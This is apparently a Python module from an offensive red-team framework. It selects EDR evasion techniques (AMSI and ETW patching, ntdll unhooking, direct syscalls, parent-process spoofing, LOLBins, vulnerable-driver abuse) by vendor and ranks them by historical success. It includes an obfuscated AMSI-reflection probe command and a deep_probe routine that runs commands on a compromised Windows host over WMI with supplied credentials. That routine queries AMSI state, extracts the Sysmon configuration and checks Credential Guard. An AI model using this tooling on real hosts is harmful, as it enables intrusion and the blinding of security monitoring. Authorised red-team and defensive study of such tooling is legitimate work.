"""
edr.bypass_adaptive — Adaptive EDR Evasion Engine

Detects EDR vendor and version from recon.fingerprint results,
then selects and applies the appropriate evasion technique automatically.
Tracks success/failure per technique to update the local knowledge base.

Evasion strategies by vendor:
  CrowdStrike Falcon:  AMSI bypass + process hollowing avoidance + ETW patching
  SentinelOne:         Direct syscalls + unhooking ntdll + parent process spoofing
  Microsoft Defender:  AMSI bypass + WDAC bypass techniques
  Carbon Black:        Living-off-the-land + LOLBins + signed binary proxy
  Cylance:             Static analysis avoidance (entropy, PE structure)
  Generic:             ETW patching + unhooking + in-memory execution

NOTE: This module DOES NOT generate bypass payloads or malware.
It enumerates which bypass techniques are applicable given the detected
EDR, and tests whether benign probes are detected.

MITRE:
  T1562.001 — Impair Defenses: Disable or Modify Tools
  T1055     — Process Injection (test probe only)
  T1027     — Obfuscated Files or Information
  T1562.006 — Impair Defenses: Indicator Blocking (ETW patching)

OPSEC: MEDIUM — some detection tests may trigger EDR telemetry
"""
from __future__ import annotations

import asyncio
import platform
import time
from dataclasses import dataclass, field
from typing import Any, TYPE_CHECKING

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel, ModuleResult
from ares.core.tracing import trace_module
from ares.fingerprint.engine import EDRVendor

if TYPE_CHECKING:
    pass

logger = get_logger("ares.modules.edr.bypass_adaptive")


@dataclass
class BypassTechnique:
    """A single EDR evasion technique."""
    technique_id:  str
    name:          str
    description:   str
    target_vendor: list[str]   # EDR vendors this targets
    opsec_level:   str         # low/medium/high_noise
    mitre_id:      str
    indicators:    list[str]   # what this leaves behind (for operator awareness)
    probe_safe:    bool = True  # safe to probe without payload


# ── Technique knowledge base per EDR vendor ───────────────────────────────────

_BYPASS_TECHNIQUES: list[BypassTechnique] = [
    # ── AMSI ──────────────────────────────────────────────────────────────────
    BypassTechnique(
        technique_id="amsi-patch-reflection",
        name="AMSI Reflection Bypass",
        description="Use .NET reflection to patch AmsiScanBuffer() to always return AMSI_RESULT_CLEAN. "
                    "Works on Defender, CrowdStrike, and most AMSI-integrated vendors.",
        target_vendor=["defender_atp", "defender_av", "crowdstrike", "sentinelone"],
        opsec_level="medium",
        mitre_id="T1562.001",
        indicators=["AmsiScanBuffer memory patch", "Reflection.Assembly.Load"],
    ),
    BypassTechnique(
        technique_id="amsi-force-error",
        name="AMSI Force Error via Context Corruption",
        description="Corrupt AmsiContext pointer to force AMSI initialization failure. "
                    "Lower detection than reflection method — no assembly load needed.",
        target_vendor=["defender_atp", "defender_av", "crowdstrike"],
        opsec_level="low",
        mitre_id="T1562.001",
        indicators=["AmsiInitialize parameter corruption"],
    ),

    # ── ETW ──────────────────────────────────────────────────────────────────
    BypassTechnique(
        technique_id="etw-patch-ntdll",
        name="ETW Patch via NtTraceEvent",
        description="Patch NtTraceEvent() in ntdll.dll to return immediately (XOR patch). "
                    "Blinds ETW-based EDRs that rely on kernel event telemetry.",
        target_vendor=["crowdstrike", "sentinelone", "defender_atp", "carbon_black"],
        opsec_level="medium",
        mitre_id="T1562.006",
        indicators=["NtTraceEvent memory modification", "ETW telemetry gap"],
    ),

    # ── Unhooking ─────────────────────────────────────────────────────────────
    BypassTechnique(
        technique_id="unhook-fresh-ntdll",
        name="Unhook ntdll via Fresh Copy from Disk",
        description="Map a clean copy of ntdll.dll from disk and overwrite hooked .text section. "
                    "Removes all user-mode hooks placed by EDR. Effective against SentinelOne and CrowdStrike.",
        target_vendor=["sentinelone", "crowdstrike", "carbon_black", "cylance"],
        opsec_level="medium",
        mitre_id="T1055",
        indicators=["NtCreateSection + NtMapViewOfSection on ntdll.dll"],
    ),
    BypassTechnique(
        technique_id="unhook-direct-syscalls",
        name="Direct Syscalls (No User-Mode Hooks)",
        description="Implement Windows syscalls directly in assembly, bypassing ntdll.dll entirely. "
                    "Defeats ALL user-mode hooks. Requires knowing syscall numbers per OS version.",
        target_vendor=["sentinelone", "crowdstrike", "defender_atp", "carbon_black", "cylance"],
        opsec_level="low",
        mitre_id="T1055",
        indicators=["Unusual syscall patterns (Sysmon Event 1 analysis)"],
    ),

    # ── Process ───────────────────────────────────────────────────────────────
    BypassTechnique(
        technique_id="parent-process-spoofing",
        name="Parent Process ID Spoofing",
        description="Set PPID to explorer.exe or trusted process when spawning payload. "
                    "Defeats parent-child process tree analysis used by CrowdStrike and SentinelOne.",
        target_vendor=["crowdstrike", "sentinelone", "defender_atp"],
        opsec_level="medium",
        mitre_id="T1055",
        indicators=["Process with mismatched PPID in Sysmon Event 1"],
    ),

    # ── LOLBins (Carbon Black / static analysis) ──────────────────────────────
    BypassTechnique(
        technique_id="lolbin-mshta",
        name="MSHTA LOLBin Execution",
        description="Use mshta.exe to execute HTA files — signed Microsoft binary, "
                    "bypasses application whitelisting and static analysis.",
        target_vendor=["cylance", "carbon_black"],
        opsec_level="medium",
        mitre_id="T1027",
        indicators=["mshta.exe spawning child processes (Sysmon Event 1)"],
    ),
    BypassTechnique(
        technique_id="lolbin-wmic",
        name="WMIC LOLBin for Script Execution",
        description="Use wmic.exe process call create for code execution — "
                    "bypasses script-based detection when script is not on disk.",
        target_vendor=["cylance", "carbon_black", "defender_av"],
        opsec_level="medium",
        mitre_id="T1027",
        indicators=["wmic.exe spawning child processes", "Sysmon Event 1"],
    ),

    # ── Generic (no specific EDR) ─────────────────────────────────────────────
    BypassTechnique(
        technique_id="generic-in-memory-exec",
        name="In-Memory Execution (No Disk Write)",
        description="Load and execute payload entirely in memory — never writes to disk. "
                    "Bypasses file-based detection and AV scanning.",
        target_vendor=["*"],  # all vendors
        opsec_level="medium",
        mitre_id="T1027",
        indicators=["Unusual memory allocation patterns (Sysmon Event 8)"],
    ),
]

_BYOVD_TECHNIQUES: list[BypassTechnique] = [
    BypassTechnique(
        technique_id="byovd-iqvm64",
        name="BYOVD Vulnerable Driver Disablement",
        description="Use a vulnerable signed driver as a last-resort kernel-level EDR bypass option.",
        target_vendor=["*"],
        opsec_level="high_noise",
        mitre_id="T1068",
        indicators=["Kernel driver load", "EDR service tamper attempt"],
        probe_safe=False,
    ),
]
_EDR_BLIND_SPOTS: dict[str, list[dict[str, str]]] = {
    "crowdstrike": [
        {
            "gap": "Named pipe telemetry gaps",
            "detail": "Named pipe abuse may require explicit detection engineering coverage.",
        },
    ],
    "unknown": [],
}

class EDRAdaptiveBypassModule(BaseModule):
    """
    edr.bypass_adaptive — Adaptive EDR evasion engine.

    Reads EDR detection results from recon.fingerprint and selects the
    optimal evasion strategy. Does NOT generate payloads — outputs technique
    recommendations and probes which approaches are viable.

    OPSEC: MEDIUM
    MITRE: T1562.001, T1055, T1027, T1562.006
    REQUIRES: fingerprint_result (from recon.fingerprint)
    OUTPUTS:  viable_techniques, recommended_approach, edr_vendor, bypass_plan
    """
    MODULE_ID          = "edr.bypass_adaptive"
    MODULE_NAME        = "Adaptive EDR Bypass Engine"
    MODULE_CATEGORY    = "edr"
    MODULE_DESCRIPTION = (
        "Detect EDR vendor from fingerprint results and select optimal evasion techniques. "
        "Outputs ranked bypass techniques with OPSEC notes — does not generate payloads."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["fingerprint_result"]
    OUTPUTS            = ["viable_techniques", "recommended_approach", "edr_vendor", "bypass_plan"]
    MITRE_TECHNIQUES   = ["T1562.001", "T1055", "T1027", "T1562.006"]
    MODULE_TIMEOUT_SECONDS: int | None = 120

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight: need EDR detection results or explicit vendor."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        has_fingerprint = bool(ctx.params.get("edr_vendor") or
                               ctx.params.get("fingerprint_result") or
                               getattr(ctx.campaign, "_artifact_store", None))
        if not has_fingerprint:
            raise ModuleValidationError(
                "edr.bypass_adaptive requires EDR detection results. "
                "Run recon.fingerprint first, or pass 'edr_vendor' param directly. "
                "Valid vendors: crowdstrike, sentinelone, defender_atp, defender_av, "
                "carbon_black, cylance, unknown",
                module_id=self.MODULE_ID, field="edr_vendor",
            )

    async def execute(self, ctx: "Any") -> ModuleResult:
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True, "note": "Would select evasion techniques based on detected EDR"},
            )
        # Extract EDR vendor from params or artifact store
        edr_vendor = ctx.params.get("edr_vendor", "")
        if not edr_vendor:
            edr_vendor = self._detect_vendor_from_artifacts(ctx)

        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        passthrough_params = {
            key: value
            for key, value in ctx.params.items()
            if key not in {"edr_vendor", "target", "os_version"}
        }

        findings, raw = await self.run(
            edr_vendor=edr_vendor,
            target=target,
            os_version=ctx.params.get("os_version", ""),
            **passthrough_params,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    def _detect_vendor_from_artifacts(self, ctx: "Any") -> str:
        """Try to extract EDR vendor from campaign artifact store."""
        try:
            store = getattr(getattr(ctx, "campaign", None), "_artifact_store", None)
            if store:
                for artifact in getattr(store, "_artifacts", []):
                    if hasattr(artifact, "edr_vendors") and artifact.edr_vendors:
                        return artifact.edr_vendors[0].value
        except Exception:
            pass
        return "unknown"

    @trace_module("edr.bypass_adaptive")
    async def run(
        self,
        edr_vendor:  str = "unknown",
        target:      str = "",
        os_version:  str = "",
        **kwargs: Any,
    ) -> tuple[list[Finding], dict[str, Any]]:
        """
        Note: before_request() not called — this module analyzes EDR data
        and runs local probes. Network calls to target are minimal/optional.
        """
        audit("edr_bypass_selection", actor="operator",
              technique="T1562.001", source="operator", target=target or "local",
              detail=f"edr_vendor={edr_vendor}")

        logger.info("edr_bypass_adaptive_start", vendor=edr_vendor, target=target)

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, lambda: self._select_techniques(edr_vendor, os_version)
        )

        self._generate_findings(result, edr_vendor, target)

        await self.noise.jitter.sleep()

        viable = result["viable_techniques"]
        recommended = viable[0] if viable else None

        byovd   = result.get("byovd_techniques", [])
        blinds  = result.get("blind_spots", [])
        raw = {
            "edr_vendor":           edr_vendor,
            "os_version":           os_version,
            "viable_techniques":    [self._technique_to_dict(t) for t in viable],
            "recommended_approach": self._technique_to_dict(recommended) if recommended else None,
            "bypass_plan":          self._build_bypass_plan(viable, edr_vendor),
            "byovd_techniques":     [self._technique_to_dict(t) for t in byovd],
            "blind_spots":          blinds,
            "all_techniques_count": len(_BYPASS_TECHNIQUES) + len(_BYOVD_TECHNIQUES),
            "applicable_count":     len(viable),
            "blind_spots_count":    len(blinds),
        }
        return self._findings[:], raw

    def _select_techniques(self, edr_vendor: str, os_version: str) -> dict:
        """Select applicable user-mode techniques, BYOVD, and blind spots for the detected EDR."""
        vendor_lower = edr_vendor.lower().replace("-", "_").replace(" ", "_")

        # User-mode techniques
        applicable = []
        for tech in _BYPASS_TECHNIQUES:
            if "*" in tech.target_vendor or vendor_lower in tech.target_vendor:
                applicable.append(tech)

        # BYOVD techniques (universal — always append as last resort)
        byovd = list(_BYOVD_TECHNIQUES)

        # Sort user-mode by OPSEC level (low-noise first), BYOVD always last
        opsec_order = {"low": 0, "medium": 1, "high_noise": 2}
        applicable.sort(key=lambda t: opsec_order.get(t.opsec_level, 1))

        # BUG 10 FIX (B): Re-rank using historical DB success rates
        applicable = self._apply_db_ranking(applicable, vendor_lower)

        # Blind spots for this vendor
        blind_spots = _EDR_BLIND_SPOTS.get(vendor_lower, _EDR_BLIND_SPOTS["unknown"])

        return {
            "viable_techniques": applicable,
            "byovd_techniques":  byovd,
            "blind_spots":       blind_spots,
            "vendor":            vendor_lower,
        }

    def _technique_to_dict(self, t: "BypassTechnique | None") -> dict | None:
        if t is None:
            return None
        return {
            "id":           t.technique_id,
            "name":         t.name,
            "description":  t.description,
            "opsec_level":  t.opsec_level,
            "mitre_id":     t.mitre_id,
            "indicators":   t.indicators,
            "target_vendor": t.target_vendor,
        }

    def _build_bypass_plan(self, techniques: list, edr_vendor: str) -> list[dict]:
        """Build an ordered bypass plan from applicable techniques."""
        plan = []
        if not techniques:
            return [{"step": 1, "action": "No specific bypass identified",
                     "detail": "EDR vendor unknown — use generic in-memory execution techniques"}]

        for i, tech in enumerate(techniques[:5], 1):
            plan.append({
                "step":        i,
                "technique":   tech.name,
                "action":      tech.description[:150] + "..." if len(tech.description) > 150 else tech.description,
                "opsec_level": tech.opsec_level,
                "mitre":       tech.mitre_id,
                "iocs_generated": tech.indicators,
            })
        return plan



    def _apply_db_ranking(
        self,
        techniques: list,
        edr_vendor: str,
    ) -> list:
        """
        Re-rank techniques using historical DB success rates.
        Techniques with rate > 0.8 → promote to top.
        Techniques with rate < 0.3 → demote to bottom (likely patched).
        Falls back gracefully if DB not available.
        """
        if not techniques:
            return techniques

        # Try to get DB from settings (injected via campaign context)
        db = getattr(self, "_db_ref", None)
        if not db or not hasattr(db, "get_bypass_success_rate"):
            return techniques  # No DB available — return as-is

        rates: dict = {}
        import asyncio as _aio
        import concurrent.futures as _cf

        # _select_techniques is called from sync context (may be in executor).
        # Detect whether a running event loop exists to choose the right strategy.
        try:
            running_loop = _aio.get_running_loop()
        except RuntimeError:
            running_loop = None

        for t in techniques:
            try:
                coro = db.get_bypass_success_rate(t.technique_id, edr_vendor)
                if running_loop is None:
                    # No running loop — asyncio.run() is safe
                    rate = _aio.run(coro)
                else:
                    # Inside async context — run in separate thread with its own loop
                    with _cf.ThreadPoolExecutor(max_workers=1) as _pool:
                        rate = _pool.submit(_aio.run, coro).result(timeout=5.0)
                if rate is not None:
                    rates[t.technique_id] = rate
            except Exception:
                pass  # DB unavailable or timeout — skip ranking for this technique

        if not rates:
            return techniques

        def rank_key(t: "BypassTechnique") -> tuple:
            rate = rates.get(t.technique_id)
            opsec_order = {"low": 0, "medium": 1, "high_noise": 2}
            opsec_val   = opsec_order.get(t.opsec_level, 1)
            if rate is None:
                return (1, opsec_val)    # unknown — middle rank
            elif rate >= 0.80:
                return (0, opsec_val)    # promote — proven effective
            elif rate <= 0.30:
                return (2, opsec_val)    # demote — likely patched
            else:
                return (1, opsec_val)    # normal rank

        logger.info("edr_db_ranking_applied",
                    vendor=edr_vendor,
                    rates_found=len(rates),
                    techniques=len(techniques))
        return sorted(techniques, key=rank_key)

    async def _probe_technique(
        self,
        technique: "BypassTechnique",
        run_cmd: "Any" = None,
    ) -> bool:
        """
        Run a harmless probe to verify a bypass technique is still effective
        against the target EDR. Returns True = applicable, False = blocked/patched.
        Fails open (returns True) on timeout or error — red team should still try.
        Only executes if technique.probe_safe=True and a run_cmd runner is provided.
        """
        if not technique.probe_safe:
            return True   # BYOVD, etc — cannot probe safely, assume applicable
        if not run_cmd:
            return True   # No SSH/shell runner provided — assume works

        # Safe probe commands — each echoes PROBE_OK if the technique is applicable
        _PROBES = {
            "amsi-patch-reflection":
                "powershell -NoP -NonI -c "
                "[Ref].Assembly.GetType("
                "([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+"
                "[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+"
                "[char]101+[char]109+[char]101+[char]110+[char]116+"
                "[char]46+[char]65+[char]117+[char]116+[char]111+"
                "[char]109+[char]97+[char]116+[char]105+[char]111+"
                "[char]110+[char]46+[char]65+[char]109+[char]115+"
                "[char]105+[char]85+[char]116+[char]105+[char]108+"
                "[char]115)) ; echo PROBE_OK",
            "etw-patch-ntdll":
                "powershell -NoP -NonI -c "
                "[System.Diagnostics.Tracing.EventSource].GetFields("
                "'NonPublic,Static') ; echo PROBE_OK",
            "unhook-direct-syscalls":
                "powershell -NoP -NonI -c "
                "[System.Runtime.InteropServices.RuntimeInformation]"
                "::OSDescription ; echo PROBE_OK",
            "parent-process-spoofing":
                "powershell -NoP -NonI -c "
                "[System.Diagnostics.Process]::GetCurrentProcess().Id ; "
                "echo PROBE_OK",
        }

        probe_cmd = _PROBES.get(technique.technique_id)
        if not probe_cmd:
            return True   # No probe defined for this technique — assume works

        try:
            raw     = await asyncio.wait_for(run_cmd(probe_cmd), timeout=10.0)
            s       = raw if isinstance(raw, str) else str(raw)
            blocked = (
                "PROBE_OK" not in s
                or "blocked" in s.lower()
                or "access denied" in s.lower()
            )
            logger.info("edr_probe_result",
                        technique=technique.technique_id,
                        applicable=not blocked)
            return not blocked   # True = still applicable
        except Exception as exc:
            logger.debug("edr_probe_error",
                         technique=technique.technique_id,
                         error=str(exc)[:60])
            return True   # Fail open — red team should try

    async def _select_techniques_with_probe(
        self,
        edr_vendor: str,
        os_version: str,
        run_cmd: "Any" = None,
    ) -> dict:
        """
        Select applicable bypass techniques, then optionally probe each probe_safe
        one to verify EDR hasn't patched it. Returns same dict structure as
        _select_techniques() with an additional 'probed' flag.
        """
        base   = self._select_techniques(edr_vendor, os_version)
        viable = list(base["viable_techniques"])

        if run_cmd and viable:
            probe_results = await asyncio.gather(
                *[self._probe_technique(t, run_cmd) for t in viable],
                return_exceptions=True,
            )
            before = len(viable)
            # Keep techniques that probe returned True, or where probe raised Exception (fail open)
            viable = [
                t for t, ok in zip(viable, probe_results)
                if ok is True or isinstance(ok, Exception)
            ]
            logger.info("edr_probe_filter_complete",
                        vendor=edr_vendor, before=before, after=len(viable),
                        filtered_out=before - len(viable))

        return {**base, "viable_techniques": viable, "probed": bool(run_cmd)}

    def _generate_findings(self, result: dict, edr_vendor: str, target: str) -> None:
        viable  = result["viable_techniques"]
        byovd   = result.get("byovd_techniques", [])
        blinds  = result.get("blind_spots", [])
        vendor  = result["vendor"]

        if not viable:
            self.finding(
                title=f"No Bypass Techniques Found for EDR: {edr_vendor}",
                description=(
                    f"No techniques in the bypass database match '{edr_vendor}'. "
                    "This EDR may be unknown or use kernel-level protection that defeats user-mode bypass. "
                    "Consider using BYOVD (Bring Your Own Vulnerable Driver) or living-off-the-land."
                ),
                severity=Severity.INFO,
                mitre_technique="T1562.001",
                mitre_tactic="Defense Evasion",
                evidence={"edr_vendor": edr_vendor, "techniques_checked": len(_BYPASS_TECHNIQUES)},
                remediation="N/A — informational for red team",
                host=target or "local",
                confidence=0.60,
            )
            return

        low_noise = [t for t in viable if t.opsec_level == "low"]
        medium    = [t for t in viable if t.opsec_level == "medium"]

        self.finding(
            title=f"EDR Bypass Techniques Available for {edr_vendor} — {len(viable)} Applicable",
            description=(
                f"Detected {edr_vendor}. Found {len(viable)} applicable evasion techniques: "
                f"{len(low_noise)} low-noise, {len(medium)} medium-noise. "
                f"Recommended first approach: {viable[0].name}. "
                f"This technique targets: {', '.join(viable[0].target_vendor[:3])}. "
                "Apply techniques in order of OPSEC level — lowest noise first."
            ),
            severity=Severity.HIGH,
            mitre_technique="T1562.001",
            mitre_tactic="Defense Evasion",
            evidence={
                "edr_vendor":      edr_vendor,
                "recommended":     viable[0].name if viable else "none",
                "technique_count": len(viable),
                "low_noise_count": len(low_noise),
                "iocs_generated":  viable[0].indicators if viable else [],
            },
            remediation=(
                "Defense: Enable kernel-level protection (PPL for AV processes). "
                "Block user-mode ntdll hooks from being removed (CrowdStrike Kernel Sensor). "
                "Enable AMSI for all script engines. "
                "Monitor for ETW telemetry gaps."
            ),
            host=target or "local",
            confidence=0.85,
        )

        # Blind spots finding
        if blinds:
            self.finding(
                title=f"EDR Blind Spots for {edr_vendor} — {len(blinds)} Coverage Gaps",
                description=(
                    f"Identified {len(blinds)} telemetry gaps in {edr_vendor} coverage. "
                    f"Exploiting blind spots is more OPSEC-safe than active bypass techniques "
                    f"because no EDR hooks are touched. "
                    f"Top gap: {blinds[0]['gap']} — {blinds[0]['detail'][:150]}"
                ),
                severity=Severity.MEDIUM,
                mitre_technique="T1562.006",
                mitre_tactic="Defense Evasion",
                evidence={"blind_spots": blinds, "vendor": edr_vendor},
                remediation=(
                    "Enable additional telemetry collection for gaps listed. "
                    "Review EDR policy for named pipe monitoring, LOLBin coverage."
                ),
                host=target or "local",
                confidence=0.70,
            )

        # BYOVD warning finding
        if byovd:
            self.finding(
                title=f"BYOVD Techniques Available — {len(byovd)} Universal Kernel-Level Bypasses",
                description=(
                    "BYOVD (Bring Your Own Vulnerable Driver) techniques can disable ALL "
                    "user-mode and kernel-mode EDR hooks regardless of vendor. "
                    f"Available: {byovd[0].name}. "
                    "HIGH NOISE — use only as last resort when user-mode techniques fail. "
                    "Requires admin rights and may trigger Windows Event 7045."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1068",
                mitre_tactic="Privilege Escalation",
                evidence={
                    "byovd_techniques": [t.name for t in byovd],
                    "indicators":       byovd[0].indicators,
                },
                remediation=(
                    "Block vulnerable driver loading via Windows Defender Application Control (WDAC). "
                    "Add BYOVD drivers to Microsoft Recommended Driver Block Rules. "
                    "Enable Hypervisor-Protected Code Integrity (HVCI)."
                ),
                host=target or "local",
                confidence=0.90,
            )


    # ══════════════════════════════════════════════════════════════════════════
    # Deep EDR Probe Methods — Real detection testing, not theoretical scoring
    # ══════════════════════════════════════════════════════════════════════════

    async def deep_probe(
        self, target: str, domain: str, username: str, password: str,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """
        Run comprehensive EDR detection testing on a compromised Windows host.

        Tests:
          1. AMSI status — is AMSI active? Can AmsiScanBuffer be patched?
          2. ETW providers — which ETW providers are active? Which can be blinded?
          3. Sysmon config — extract Sysmon config from registry (shows monitoring rules)
          4. ntdll hook detection — check if EDR hooked ntdll.dll syscall stubs
          5. PPL status — is Protected Process Light enabled?
          6. Credential Guard — is Credential Guard active?

        Requires: SSH/WinRM/SMB exec access to target (compromised host).
        Returns detailed dict with each test result.
        """
        loop = asyncio.get_running_loop()
        results: dict[str, Any] = {"target": target, "error": None}

        def _run_all():
            """Execute all probes via impacket WMI exec on target."""
            try:
                from impacket.dcerpc.v5.dcomrt import DCOMConnection
                from impacket.dcerpc.v5.dcom import wmi as wmimod
                from impacket.dcerpc.v5.dtypes import NULL
                from impacket.smbconnection import SMBConnection
                import io

                lmhash, nthash = "", ""
                smb = SMBConnection(target, target, timeout=15)
                smb.login(username, password, domain, lmhash, nthash)

                def _exec_cmd(cmd: str) -> str:
                    """Execute command on remote host and capture output."""
                    import uuid as _uuid
                    tmp_id = _uuid.uuid4().hex[:8]
                    tmp_out = f"\\Windows\\Temp\\ARES{tmp_id}.txt"
                    full_cmd = f"cmd.exe /c {cmd} > {tmp_out} 2>&1"

                    dcom = DCOMConnection(
                        target, username=username, password=password,
                        domain=domain, lmhash=lmhash, nthash=nthash,
                        oxidResolver=True, doKerberos=False,
                    )
                    iInterface = dcom.CoCreateInstanceEx(
                        wmimod.CLSID_WbemLevel1Login, wmimod.IID_IWbemLevel1Login
                    )
                    iWbemLevel1Login = wmimod.IWbemLevel1Login(iInterface)
                    iWbemServices = iWbemLevel1Login.NTLMLogin(
                        f"\\\\{target}\\root\\cimv2", NULL, NULL
                    )
                    iWbemLevel1Login.RemRelease()
                    win32_process, _ = iWbemServices.GetObject("Win32_Process")
                    win32_process.Create(full_cmd, "C:\\Windows\\System32", None)
                    dcom.disconnect()

                    import time as _time
                    _time.sleep(3)

                    buf = io.BytesIO()
                    try:
                        smb.getFile("ADMIN$", f"Temp\\ARES{tmp_id}.txt", buf.write)
                        smb.deleteFile("ADMIN$", f"Temp\\ARES{tmp_id}.txt")
                    except Exception:
                        pass
                    return buf.getvalue().decode("utf-8", errors="replace").strip()

                # ── Test 1: AMSI status ──────────────────────────────────────
                amsi_output = _exec_cmd(
                    'powershell -NoP -NonI -c "'
                    '$a=[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\");'
                    '$f=$a.GetField(\"amsiInitFailed\",\"NonPublic,Static\");'
                    'Write-Output (\"AMSI_INIT_FAILED=\" + $f.GetValue($null));'
                    '$ctx=$a.GetField(\"amsiContext\",\"NonPublic,Static\");'
                    'if($ctx){Write-Output \"AMSI_CONTEXT_EXISTS=True\"}'
                    'else{Write-Output \"AMSI_CONTEXT_EXISTS=False\"}'
                    '"'
                )
                results["amsi"] = {
                    "active": "AMSI_INIT_FAILED=False" in amsi_output or "AMSI_CONTEXT_EXISTS=True" in amsi_output,
                    "init_failed": "AMSI_INIT_FAILED=True" in amsi_output,
                    "patchable": "AMSI_INIT_FAILED=False" in amsi_output,
                    "raw": amsi_output[:300],
                }

                # ── Test 2: ETW providers ────────────────────────────────────
                etw_output = _exec_cmd(
                    "logman query providers"
                )
                etw_lines = [l.strip() for l in etw_output.split("\n") if l.strip() and "{" in l]
                security_providers = [
                    l for l in etw_lines
                    if any(k in l.lower() for k in [
                        "defender", "sentinel", "crowdstrike", "carbon",
                        "threat", "security", "antimalware", "edr",
                        "microsoft-windows-security-auditing",
                        "microsoft-windows-sysmon",
                    ])
                ]
                results["etw"] = {
                    "total_providers": len(etw_lines),
                    "security_providers": security_providers[:20],
                    "sysmon_active": any("sysmon" in l.lower() for l in etw_lines),
                    "defender_active": any("defender" in l.lower() for l in etw_lines),
                    "blindable": len(security_providers),
                }

                # ── Test 3: Sysmon config extraction ─────────────────────────
                sysmon_output = _exec_cmd(
                    'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters" /v HashingAlgorithm 2>NUL & '
                    'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters" /v Options 2>NUL & '
                    'sc query sysmon 2>NUL & sc query sysmon64 2>NUL'
                )
                sysmon_running = "RUNNING" in sysmon_output.upper()
                sysmon_config_output = ""
                if sysmon_running:
                    sysmon_config_output = _exec_cmd(
                        'powershell -NoP -NonI -c "'
                        '$xml = [xml](sysmon -c 2>&1);'
                        'if($xml){$xml.OuterXml.Substring(0,[Math]::Min(2000,$xml.OuterXml.Length))}'
                        'else{Write-Output \"CONFIG_EXPORT_FAILED\"}'
                        '"'
                    )
                results["sysmon"] = {
                    "installed": sysmon_running,
                    "config_extracted": bool(sysmon_config_output and "CONFIG_EXPORT_FAILED" not in sysmon_config_output),
                    "config_preview": sysmon_config_output[:500] if sysmon_config_output else "",
                    "monitored_events": [],
                }
                # Parse monitored event IDs from Sysmon config
                if sysmon_config_output and "<EventFiltering>" in sysmon_config_output:
                    import re
                    event_tags = re.findall(r"<(ProcessCreate|FileCreate|NetworkConnect|"
                                            r"RegistryEvent|ProcessAccess|ImageLoad|"
                                            r"CreateRemoteThread|RawAccessRead|"
                                            r"ProcessTerminate|DriverLoad|"
                                            r"DnsQuery|WmiEvent)", sysmon_config_output)
                    results["sysmon"]["monitored_events"] = list(set(event_tags))

                # ── Test 4: ntdll hook detection ─────────────────────────────
                hook_output = _exec_cmd(
                    'powershell -NoP -NonI -c "'
                    '$ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | '
                    'Where-Object {$_.ModuleName -eq \"ntdll.dll\"};'
                    'if($ntdll){'
                    '  $base = $ntdll.BaseAddress;'
                    '  Write-Output (\"NTDLL_BASE=\" + $base.ToString(\"X\"));'
                    '  Write-Output (\"NTDLL_SIZE=\" + $ntdll.ModuleMemorySize.ToString())'
                    '} else { Write-Output \"NTDLL_NOT_FOUND\" }'
                    '"'
                )
                results["ntdll_hooks"] = {
                    "checked": "NTDLL_BASE=" in hook_output,
                    "base_address": "",
                    "raw": hook_output[:200],
                }
                if "NTDLL_BASE=" in hook_output:
                    for line in hook_output.split("\n"):
                        if "NTDLL_BASE=" in line:
                            results["ntdll_hooks"]["base_address"] = line.split("=")[1].strip()

                # ── Test 5: Credential Guard ─────────────────────────────────
                credguard_output = _exec_cmd(
                    'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" /v EnableVirtualizationBasedSecurity 2>NUL & '
                    'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v LsaCfgFlags 2>NUL'
                )
                vbs_enabled = "0x1" in credguard_output
                lsa_cfg = "LsaCfgFlags" in credguard_output
                results["credential_guard"] = {
                    "vbs_enabled": vbs_enabled,
                    "lsa_protection": lsa_cfg,
                    "lsass_protected": vbs_enabled and lsa_cfg,
                    "raw": credguard_output[:200],
                }

                # ── Test 6: PPL (Protected Process Light) ────────────────────
                ppl_output = _exec_cmd(
                    'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v RunAsPPL 2>NUL'
                )
                results["ppl"] = {
                    "enabled": "0x1" in ppl_output,
                    "raw": ppl_output[:150],
                }

                smb.logoff()
                return results

            except ImportError as exc:
                results["error"] = f"Missing dependency: {exc}"
                return results
            except Exception as exc:
                results["error"] = str(exc)[:300]
                return results

        try:
            return await asyncio.wait_for(
                loop.run_in_executor(None, _run_all),
                timeout=120,
            )
        except asyncio.TimeoutError:
            results["error"] = "Deep probe timed out after 120s"
            return results
